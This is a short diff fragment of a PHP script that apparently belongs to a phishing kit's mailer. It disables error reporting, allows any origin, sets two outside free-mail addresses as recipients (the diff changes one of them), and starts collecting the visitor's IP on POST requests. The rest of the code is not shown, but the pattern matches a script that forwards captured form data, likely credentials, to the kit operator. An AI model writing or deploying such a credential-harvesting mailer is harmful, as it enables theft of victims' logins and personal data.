@@ -2,7 +2,7 @@
 header('Access-Control-Allow-Origin: *');  
 error_reporting(0);
 
-$to = "c4717287@gmail.com,evanskelvin2019@yandex.ru";
+$to = "jc4717287@gmail.com,evanskelvin2019@yandex.ru";
 
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
 	$client  = @$_SERVER['HTTP_CLIENT_IP'];
